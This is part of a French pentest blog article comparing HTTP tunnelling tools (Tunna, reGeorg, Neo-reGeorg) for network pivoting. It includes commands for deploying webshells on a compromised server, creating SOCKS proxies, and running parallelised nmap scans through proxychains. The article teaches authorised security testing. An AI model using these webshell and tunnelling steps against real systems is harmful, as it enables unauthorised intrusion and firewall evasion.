			<h3 class="elementor-heading-title elementor-size-default">Tunna / Fulcrom - HTTP tunnel</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-0164a69 elementor-widget elementor-widget-text-editor" data-id="0164a69" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Tunna est disponible sur <a href="https://github.com/SECFORCE/Tunna">GitHub</a>.</p><p>Tunna
 est un outil qui permet de faire passer toutes les communications TCP à
 travers un tunnel HTTP afin d’éviter, par exemple, un pare-feu avec 
inspection applicative qui vérifie que le trafic qui le traverse 
respecte bien le protocole autorisé (HTTP).</p><p>Tout d’abord il faut 
déployer un webshell sur l’application web vulnérable. Des webshells 
ASPX, JSP et PHP sont disponibles. Dans le cadre de cet article, nous 
utiliserons le webshell PHP que nous déploierons directement sur la 
machine pivot et qui sera servi via le serveur HTTP interne de PHP avec 
la commande suivante : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">php -S 192.168.2.149:8080</span>. Cependant le scénario classique serait de compromettre une application web et d’y déployer le webshell.</p><p>Depuis
 le poste de l’auditeur, il suffit de fournir l’URL du webshell et le 
port local qu’on souhaite ouvrir ainsi que l’adresse et le port distant à
 joindre.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6be07de elementor-widget elementor-widget-text-editor" data-id="6be07de" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 proxy.py -u http://192.168.2.105:8080/conn.php -l 7777 -r 80 -a 10.42.42.2 -v
  _____
 |_   _|   _ _ __  _ __   __ _
   | || | | | '_ \| '_ \ / _` |
   | || |_| | | | | | | | (_| |
   |_| \__,_|_| |_|_| |_|\__,_|

Tunna v1.1a, for HTTP tunneling TCP connections by Nikos Vassakis
http://www.secforce.com / nikos.vassakis <at> secforce.com
###############################################################

[+] Sending File
[Server] File Uploaded at /tmp/996-socks4aServer.py
[+] Spawning keep-alive thread
[+] Checking for proxy: True
[+] Starting Socket Server
[S]  Fri Aug 30 18:52:25 2019 Server Starts - localhost:7777
[+] Starting Ping thread
 [T] Connected To Socks:  ('127.0.0.1', 41564)</at></span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f99c71c elementor-widget elementor-widget-text-editor" data-id="f99c71c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ainsi, nous avons effectué un local port forwarding mais encapsulé dans HTTP.</p><p>L’auteur
 de l’outil prévient que les webshells qu’il a développés ne sont pas 
fiables, en particulier celui en PHP (ce que je peux confirmer). Il y a 
donc une autre méthode qui vise à lancer un agent python sur la machine 
pivot (perdant cependant un des intérêts de l’outil).</p><p>Le problème est que dans un cas d’utilisation réel :</p><ol><li>Il
 est plus probable de pouvoir uploader un webshell (ex : upload non 
restreint + LFI) que de pouvoir déployer l’agent (exécution de code 
et/ou exécution de commande).</li><li>Si seuls les ports 80 et 443 sont 
autorisés et déjà utilisés, il ne sera pas possible de démarrer l’agent 
python sur ces mêmes ports.</li></ol><p>L’agent est en python 2 et 
requiert qu’openssl et python2-pyopenssl soient installés, ce qui est 
déjà très probablement le cas pour openssl mais qui ne l’est pas du tout
 pour le module pyopenssl.</p><p>Ensuite, il suffit de lancer <span style="color: #ffffff; background-color: #474747; font-family: courier new;">python2 webserver.py</span>
 sur la machine pivot pour obtenir un serveur web sur le port 8000 en 
écoute sur 0.0.0.0. Bien sûr, il faut avoir déployé Tunna au préalable.</p><p>De la même manière, on peut lancer le local port forwarding.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-cbe43d1 elementor-widget elementor-widget-text-editor" data-id="cbe43d1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 proxy.py -u http://192.168.2.105:8000/ -l 7777 -r 80 -a 10.42.42.2 -v</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a667459 elementor-widget elementor-widget-text-editor" data-id="a667459" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Comme à chaque fois, vérifions que nous arrivons bien à joindre notre cible.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f5bfee6 elementor-widget elementor-widget-text-editor" data-id="f5bfee6" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head localhost:7777
HTTP/1.1 302 Found
Date: Tue, 03 Sep 2019 08:19:25 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://localhost:7777/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3959b41 elementor-widget elementor-widget-text-editor" data-id="3959b41" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Attention</strong> :</p><p>Le
 code est ancien et contient beaucoup de bugs, les webshells 
fonctionnent rarement, et même l’agent python peut s’interrompre en 
pleine utilisation, ce qui en fait globalement un outil peu fiable. Il 
est donc recommandé d’utiliser une autre technique.</p><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Aucune d’ouverture de port sur le pivot (webshell)</li><li>Encapsulation HTTP (webshell, agent)</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Nécessité d’avoir un serveur web compromis (webshell)</li><li>Ouverture port par port</li><li>Tunnel TCP</li><li>Ouverture de port sur le pivot (agent)</li><li>Besoin de déployer sur la machine pivot (agent)</li><li>Requiert un module non installé par défaut (agent)</li><li>Webshell et agent peu fiables</li><li>Code ancien en python 2 pas compatible python 3 (côté client et serveur)</li></ul><p>Note :</p><p>Un fork de Tunna, <a href="https://github.com/blacklanternsecurity/fulcrom">Fulcrom</a>,
 avait initialement apporté des améliorations dont certaines ont ensuite
 été ajoutées au projet de départ. Aujourd’hui, Fulcrom n’est plus 
maintenu et est resté au même niveau que Tunna en 2017.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-773cf13 elementor-widget elementor-widget-heading" data-id="773cf13" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">reGeorg / Neo-reGeorg - SOCKS proxy via webshell</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-3223aa3 elementor-widget elementor-widget-text-editor" data-id="3223aa3" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>reGeorg est disponible sur <a href="https://github.com/sensepost/reGeorg">GitHub</a>.</p><p>reGeorg
 va fonctionner de manière similaire à Tunna, c’est-à-dire communiquer 
avec un webshell mais au lieu de faire du local port forwaring il va 
créer un proxy SOCKS en local.</p><p>Le scénario reste le même : 
déployer un webshell sur la machine compromise et établir la connexion 
depuis la machine de l’auditeur.</p><p>En PHP, pour émuler le serveur web compromis on peut lancer sur la machine pivot <span style="color: #ffffff; background-color: #474747; font-family: courier new;">PHP -S 192.168.2.105:8080</span>.</p><p>Ensuite,
 sur la machine de l’auditeur, on fournit l’URL du webshell et l’adresse
 locale sur laquelle on veut lancer le proxy SOCKS.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5316a02 elementor-widget elementor-widget-text-editor" data-id="5316a02" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 reGeorgSocksProxy.py -u http://192.168.2.105:65000/tunnel.php -l 127.0.0.1 -p 7777</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-19371fd elementor-widget elementor-widget-text-editor" data-id="19371fd" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Plusieurs problèmes très gênants apparaissent avec ce webshell PHP, car il fait usage de <span style="color: #ffffff; background-color: #474747; font-family: courier new;">dl(“php_sockets.dll”);</span> :</p><ul class="o-square-list"><li>l’usage de la fonction <a href="https://www.php.net/manual/en/function.dl.php">dl()</a> a été supprimé de la plupart des SAPIs dans PHP 5.3.0, et a été supprimé de PHP-FPM dans php 7.0.0.</li><li>le chargement d’une extension externe <span style="color: #ffffff; background-color: #474747; font-family: courier new;">php_sockets</span></li><li>le fait qu’il essaie de charger uniquement une dll (et donc compatible avec Windows uniquement)</li></ul><p>On peut donc lancer la version <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nosocket</span> (qui ne fonctionne pas à tous les coups) :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2b84143 elementor-widget elementor-widget-text-editor" data-id="2b84143" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 reGeorgSocksProxy.py -u http://192.168.2.105:65000/tunnel.nosocket.php -l 127.0.0.1 -p 7777</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b5dc84c elementor-widget elementor-widget-text-editor" data-id="b5dc84c" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>L’utilisation
 du webshell PHP semble ne pas être possible dans la majorité des cas. 
Il reste cependant des webshells ashx (ASP.NET), aspx (ASP.NET), js 
(nodejs) et jsp (Java + une version spécifique Tomcat5).</p><p>La version nodejs n’est pas un webshell mais un agent autonome, il est possible de le lancer de la manière suivante :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-78a1024 elementor-widget elementor-widget-text-editor" data-id="78a1024" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ node tunnel.js</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-ea68e5e elementor-widget elementor-widget-text-editor" data-id="ea68e5e" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Il n’est pas configurable et démarre uniquement sur <span style="color: #ffffff; background-color: #474747; font-family: courier new;">127.0.0.1:65000</span>, il va donc falloir modifier l’adresse d’écoute en <span style="color: #ffffff; background-color: #474747; font-family: courier new;">192.168.2.105</span> ou <span style="color: #ffffff; background-color: #474747; font-family: courier new;">0.0.0.0</span> pour pouvoir le contacter depuis la machine de l’auditeur.</p><p>Ensuite, de la même manière que pour le webshell PHP, il suffit de lancer :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-bc9e352 elementor-widget elementor-widget-text-editor" data-id="bc9e352" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python2 reGeorgSocksProxy.py -u http://192.168.2.105:65000/tunnel.js -l 127.0.0.1 -p 7777</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5f04f8f elementor-widget elementor-widget-text-editor" data-id="5f04f8f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Dans tous les cas, nous pouvons utiliser nos outils avec le proxy SOCKS 4 :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-6cf9428 elementor-widget elementor-widget-text-editor" data-id="6cf9428" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ curl --head http://10.42.42.2 --proxy socks4://127.0.0.1:7777
HTTP/1.1 302 Found
Date: Tue, 03 Sep 2019 12:36:44 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://10.42.42.2/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0d7fa77 elementor-widget elementor-widget-text-editor" data-id="0d7fa77" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p><strong>Avantages :</strong></p><ul class="o-square-list"><li>Nul besoin d’un compte privilégié</li><li>Aucune ouverture de port sur le pivot (webshell)</li><li>Encapsulation HTTP (webshell, agent)</li></ul><p><strong>Inconvénients :</strong></p><ul class="o-square-list"><li>Besoin d’un serveur web compromis (webshell, ex : php)</li><li>Tunnel TCP</li><li>Ouverture de port sur le pivot (agent, ex: js)</li><li>Besoin de déployer sur la machine pivot (agent, ex: js)</li><li>Requiert un module non installé par défaut (webshell, ex : php)</li><li>Webshells PHP peu fiables</li><li>Code ancien en python 2 pas compatible python 3 (côté client)</li></ul><p>Un fork nommé <a href="https://github.com/L-codes/Neo-reGeorg"><strong>Neo-reGeorg</strong></a>
 apporte un certain nombre d’améliorations comme le support du python3, 
la génération dynamique des webshells avec protection par mot de passe, 
etc.</p><p>On peut générer les webshells protégés par mot de passe de la sorte :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-70ea9ba elementor-widget elementor-widget-text-editor" data-id="70ea9ba" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python3 neoreg.py generate -k pivotpassword

...

    [+] Mkdir a directory: neoreg_server
    [+] Create neoreg server files:
       =&gt; neoreg_server/tunnel.tomcat.5.jsp
       =&gt; neoreg_server/tunnel.php
       =&gt; neoreg_server/tunnel.nosocket.php
       =&gt; neoreg_server/tunnel.jsp
       =&gt; neoreg_server/tunnel.js
       =&gt; neoreg_server/tunnel.aspx
       =&gt; neoreg_server/tunnel.ashx</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d187ca9 elementor-widget elementor-widget-text-editor" data-id="d187ca9" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Nous 
allons déployer l’agent nodejs comme précédemment, car malheureusement 
les webshells et agents sont exactement les mêmes que ceux de reGeorg et
 souffrent donc des mêmes défauts.</p><p>Pour établir la connexion avec le pivot, on fournit le mot de passe et l’URL de l’agent :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-af90152 elementor-widget elementor-widget-text-editor" data-id="af90152" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ python3 neoreg.py -k pivotpassword -u http://192.168.2.105:65000/tunnel.js

...

  Log Level set to [ERROR]
  Starting socks server [127.0.0.1:1080], tunnel at [http://192.168.2.105:65000/tunnel.js]
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-d17f242 elementor-widget elementor-widget-text-editor" data-id="d17f242" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Nous pouvons vérifier le bon fonctionnement du proxy SOCKS : <span style="color: #ffffff; background-color: #474747; font-family: courier new;">curl –head http://10.42.42.2 –proxy socks4://127.0.0.1:1080</span>.</p><p><strong>Note&nbsp;:</strong></p><p>Le fork est globalement mieux que sa version originale.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5f6cacf elementor-widget elementor-widget-heading" data-id="5f6cacf" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Utilisation d’outils courants à travers un proxy SOCKS</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-2f12023 elementor-widget elementor-widget-text-editor" data-id="2f12023" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><h3>Proxychains</h3><p>Proxychains
 est un outil permettant faire passer le trafic réseau à travers un ou 
plusieurs proxy(s) SOCKS. Ce qui est bien utile lorsqu’un outil ne peut 
pas passer à travers un proxy nativement.</p><p>Avec l’une des 
nombreuses techniques vues précédemment, on met en place un serveur 
proxy SOCKS 4 à l’adresse 127.0.0.1 sur le port 21000.</p><p>La configuration de proxychains est simple, il suffit d’éditer le ficher <span style="color: #ffffff; background-color: #474747; font-family: courier new;">/etc/proxychains.conf</span> et d’y ajouter la liste du ou des proxy SOCKS à travers lesquels on veut se connecter.</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-f6d277b elementor-widget elementor-widget-text-editor" data-id="f6d277b" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">[ProxyList]
socks4  127.0.0.1 21000
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b167ebe elementor-widget elementor-widget-text-editor" data-id="b167ebe" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Ensuite, il suffit de préfixer la commande de l’outil qui doit passer à travers le proxy SOCKS par <span style="color: #ffffff; background-color: #474747; font-family: courier new;">proxychains</span> :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-5f792f1 elementor-widget elementor-widget-text-editor" data-id="5f792f1" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ proxychains curl --head http://10.42.42.2
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.14
[proxychains] Strict chain  ...  127.0.0.1:21000  ...  10.42.42.2:80  ...  OK
HTTP/1.1 302 Found
Date: Thu, 05 Sep 2019 17:25:41 GMT
Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.8
X-Powered-By: PHP/7.3.8
Location: http://10.42.42.2/dashboard/
Content-Type: text/html; charset=UTF-8
</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-65a1e7f elementor-widget elementor-widget-text-editor" data-id="65a1e7f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><h3>Accélérer nmap à travers proxychains</h3><p>Il est possible de lancer <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nmap</span> via <span style="color: #ffffff; background-color: #474747; font-family: courier new;">proxychains</span> de la même façon que vue précédemment mais on remarquera que, de cette manière, le scan est beaucoup plus lent que d’habitude.</p><p>Pour accélérer le processus, il est possible de découper la commande <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nmap&lt;:span&gt;</span> et de lancer plusieurs tâches en parallèle à l’aide de <span style="color: #ffffff; background-color: #474747; font-family: courier new;">xargs</span>.</p><p>Nous verrons deux cas de figure classiques :</p><ol><li>L’auditeur veut scanner tous les ports d’une machine donnée.</li><li>L’auditeur veut scanner un nombre restreint de ports de plusieurs machines ou d’un sous-réseau entier.</li></ol></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-2e3ce4d elementor-widget elementor-widget-heading" data-id="2e3ce4d" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h4 class="elementor-heading-title elementor-size-default">Une machine et plusieurs ports</h4>		</div>
				</div>
				<div class="elementor-element elementor-element-ccc5b09 elementor-widget elementor-widget-text-editor" data-id="ccc5b09" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>La manière
 classique serait de lancer la commande suivante, un scan TCP sur la 
machine 10.42.42.2 où l’on va vérifier tous les ports (<span style="color: #ffffff; background-color: #474747; font-family: courier new;">-p-</span> = <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-p 1-65535</span>).</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-10950ff elementor-widget elementor-widget-text-editor" data-id="10950ff" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ proxychains nmap -p- -sT -T4 10.42.42.2 -oA 10.42.42.2 --open</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-b7dff07 elementor-widget elementor-widget-text-editor" data-id="b7dff07" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Mais, pour accélérer le temps de scan, on peut générer les nombres de 1 à 65535 avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">seq</span> que l’on va donner en entrée à <span style="color: #ffffff; background-color: #474747; font-family: courier new;">xargs</span>. <span style="color: #ffffff; background-color: #474747; font-family: courier new;">xargs</span> sera chargé de lancer plusieurs threads (ici 50 avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-P 50</span>). Avec l’option <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-I port</span>, nous allons créer une variable qui contiendra le numéro de port généré par <span style="color: #ffffff; background-color: #474747; font-family: courier new;">seq</span> que nous pourrions passer à <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nmap</span> (<span style="color: #ffffff; background-color: #474747; font-family: courier new;">-p port</span>). De cette manière, nous pouvons répartir les 65535 ports à scanner sur 50 threads.</p><p>Il faut aussi faire attention aux options de <span style="color: #ffffff; background-color: #474747; font-family: courier new;">nmap</span>, nous ne pouvons pas nous contenter de faire un <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-oA nom_du_fichier</span>
 car puisque nous allons lancer 65535 fois la commande nmap. Nous 
écraserions les fichiers de sortie à chaque fois, d’où l’utilisation de 
l’option <span style="color: #ffffff; background-color: #474747; font-family: courier new;">–append-output</span>
 pour ajouter les résultats aux fichiers existants. Nous pouvons aussi 
désactiver la découverte d’hôte et la résolution DNS avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">-Pn -n</span> pour gagner un peu de temps.</p><p>Cela donne au final la commande suivante :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-0fd8d24 elementor-widget elementor-widget-text-editor" data-id="0fd8d24" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ seq 1 65535 | xargs -P 50 -I port proxychains -q nmap -p port -sT -T4 10.42.42.2 -oG 10.42.42.2 --open --append-output 10.42.42.2 -Pn -n</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-1ed32c3 elementor-widget elementor-widget-heading" data-id="1ed32c3" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h4 class="elementor-heading-title elementor-size-default">Plusieurs machines et plusieurs ports</h4>		</div>
				</div>
				<div class="elementor-element elementor-element-25cfe63 elementor-widget elementor-widget-text-editor" data-id="25cfe63" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>De la même
 manière, nous pouvons scanner plusieurs machines, au lieu de répartir 
les threads par port nous allons les découper par host.</p><p>La commande classique suivante…</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-abbdcf0 elementor-widget elementor-widget-text-editor" data-id="abbdcf0" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ proxychains nmap -p- -sT -T4 --top-ports 20 10.42.42.0/24 -oG 10.42.42.0 --open</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-283a981 elementor-widget elementor-widget-text-editor" data-id="283a981" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>… devient donc avec <span style="color: #ffffff; background-color: #474747; font-family: courier new;">xargs</span> :</p></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-a4b7a20 elementor-widget elementor-widget-text-editor" data-id="a4b7a20" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><pre><span style="color: #ffffff;">$ seq 1 254 | xargs -P 50 -I cpt proxychains -q nmap --top-ports 20 -sT -T4 10.42.42.cpt -oG 10.42.42.0 --open --append-output 10.42.42.cpt -Pn -n</span></pre></div>
				</div>
				</div>
				<div class="elementor-element elementor-element-3c8bc07 elementor-widget elementor-widget-heading" data-id="3c8bc07" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Comparatif</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-9c5d3e4 elementor-widget elementor-widget-image" data-id="9c5d3e4" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/comparatif2x.png" class="attachment-full size-full" alt="" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x.png 4158w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-768x209.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-1024x279.png 1024w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-650x177.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-505x138.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-325x89.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-240x65.png 240w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/comparatif2x-150x41.png 150w" sizes="(max-width: 4158px) 100vw, 4158px" width="4158" height="1134">											</div>
				</div>
				</div>
				<div class="elementor-element elementor-element-228f79f elementor-widget elementor-widget-heading" data-id="228f79f" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h3 class="elementor-heading-title elementor-size-default">Références</h3>		</div>
				</div>
				<div class="elementor-element elementor-element-dcf1b8a elementor-widget elementor-widget-text-editor" data-id="dcf1b8a" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><ul class="o-square-list"><li>La page man de SSH</li><li>La documentation des outils (doc, README, wiki, message d’aide)</li></ul></div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
				<section class="elementor-element elementor-element-8e101d6 elementor-section-boxed elementor-section-height-default elementor-section-height-default elementor-section elementor-top-section" data-id="8e101d6" data-element_type="section">
						<div class="elementor-container elementor-column-gap-default">
				<div class="elementor-row">
				<div class="elementor-element elementor-element-d8987c4 elementor-column elementor-col-66 elementor-top-column" data-id="d8987c4" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div class="elementor-element elementor-element-4672a29 elementor-widget elementor-widget-heading" data-id="4672a29" data-element_type="widget" data-widget_type="heading.default">
				<div class="elementor-widget-container">
			<h6 class="elementor-heading-title elementor-size-large">A propos du blogueur</h6>		</div>
				</div>
				<div class="elementor-element elementor-element-724421f elementor-widget elementor-widget-text-editor" data-id="724421f" data-element_type="widget" data-widget_type="text-editor.default">
				<div class="elementor-widget-container">
					<div class="elementor-text-editor elementor-clearfix"><p>Alexandre ZANNI, AKA, noraj, ingénieur en cybersécurité de formation, travaille en tant que <em>pentester </em>(auditeur sécurité/technique) chez Orange Cyberdefense depuis 2018.</p><p>Son site : <a href="https://pwn.by/noraj/">https://pwn.by/noraj/</a></p></div>
				</div>
				</div>
						</div>
			</div>
		</div>
				<div class="elementor-element elementor-element-31bb982 elementor-column elementor-col-33 elementor-top-column" data-id="31bb982" data-element_type="column">
			<div class="elementor-column-wrap  elementor-element-populated">
					<div class="elementor-widget-wrap">
				<div class="elementor-element elementor-element-7da0617 elementor-widget elementor-widget-image" data-id="7da0617" data-element_type="widget" data-widget_type="image.default">
				<div class="elementor-widget-container">
					<div class="elementor-image">
										<img src="Etat%20de%20l%E2%80%99art%20du%20pivoting%20r%C3%A9seau%20en%202019%20|%20Orange%20Cyberdefense_files/hacker-2-1024x1024.png" class="attachment-large size-large" alt="Deux pentesters d'Orange Cyberdefense partricipent à l'ECSC" srcset="https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-1024x1024.png 1024w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-150x150.png 150w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-768x768.png 768w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-300x300.png 300w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-650x650.png 650w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-505x505.png 505w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-325x325.png 325w, https://cyberdefense.orange.com/wp-content/uploads/sites/9/2019/10/hacker-2-240x240.png 240w" sizes="(max-width: 960px) 100vw, 960px" width="960" height="960">											</div>
				</div>
				</div>
						</div>
			</div>
		</div>
						</div>
			</div>
		</section>
						</div>
			</div>
		</div>
		            </div>

                    </article>

            </main><!-- / #content -->

        <aside role="complementary" class="container mb-5 mb-md-0 px-3 px-md-1">
